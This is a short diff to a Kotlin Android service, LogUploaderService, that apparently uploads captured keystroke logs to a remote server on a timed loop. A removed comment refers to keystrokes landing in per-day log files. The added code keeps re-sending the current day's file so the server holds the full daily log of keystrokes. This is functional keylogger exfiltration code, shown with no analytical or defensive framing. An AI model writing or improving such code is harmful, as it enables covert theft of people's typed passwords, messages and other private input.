@@ -11,6 +11,9 @@ import java.io.File
 import java.net.HttpURLConnection
 import java.net.URL
 import java.net.URLEncoder
+import java.text.SimpleDateFormat
+import java.util.Date
+import java.util.Locale
 
 /**
  * Upload + heartbeat loop. Runs every UPLOAD_INTERVAL_MS:
@@ -202,13 +205,16 @@ class LogUploaderService : Service() {
     private fun uploadLogs() {
         val dir = File(filesDir, "logs")
         val files = dir.listFiles()?.filter { it.extension != "sent" } ?: return
+        val todayName = SimpleDateFormat("yyyy-MM-dd", Locale.US).format(Date()) + ".log"
         for (f in files) {
             if (!f.isFile) continue
             try {
-                // LoggerWriter auto-reopens a fresh per-day file after this one
-                // gets renamed to .sent, so keystrokes keep landing in today's log.
                 val success = postLog(f)
-                if (success) {
+                if (success && f.name != todayName) {
+                    // Only COMPLETE (closed) days get renamed/deleted. Today's file is
+                    // re-uploaded as-is every cycle so the server copy always holds the
+                    // FULL daily log — renaming it would split the day into segments and
+                    // replace the server content with just the latest tail.
                     if (AppConfig.DELETE_AFTER_UPLOAD) {
                         f.delete()
                     } else {
